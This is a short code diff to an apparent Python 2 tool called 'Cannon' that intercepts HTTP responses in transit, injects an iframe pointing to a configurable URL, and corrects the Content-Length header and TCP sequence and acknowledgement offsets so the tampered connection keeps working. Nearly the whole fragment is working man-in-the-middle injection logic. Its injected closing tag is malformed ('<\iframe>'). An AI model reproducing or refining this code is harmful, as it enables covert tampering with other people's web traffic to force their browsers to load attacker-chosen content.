@@ -92,10 +92,14 @@ class Cannon(object):
                 start = tcpContent.find("Content-Length: ") + len("Content-Length: ")
                 end = tcpContent.find("\r\n", start)
                 print "length: " + tcpContent[start:end]
+                
                 oldLen = int(tcpContent[start:end])
-                # todo check content-length edge case
-                tcpContent = tcpContent.replace(tcpContent[start : end], str(oldLen + len('<iframe src="' + self.iframe_url + '"><\iframe>')))
+                newLen = oldLen + len('<iframe src="' + self.iframe_url + '"><\iframe>')
+                offset =  len(str(newLen)) - len(str(oldLen))
+                tcpContent = tcpContent.replace(tcpContent[start : end], str(newLen))
                 tcp.payload = tcpContent
+                self.connMap[res]['ack'] += 0 - offset
+                self.connMap[req]['seq'] += offset
                 # print 'ack offset: ' + str(self.connMap[res]['ack'])
                 # print 'seq offset: ' + str(self.connMap[req]['seq'])
                 # print 'ack: ' + str(tcp.ack)
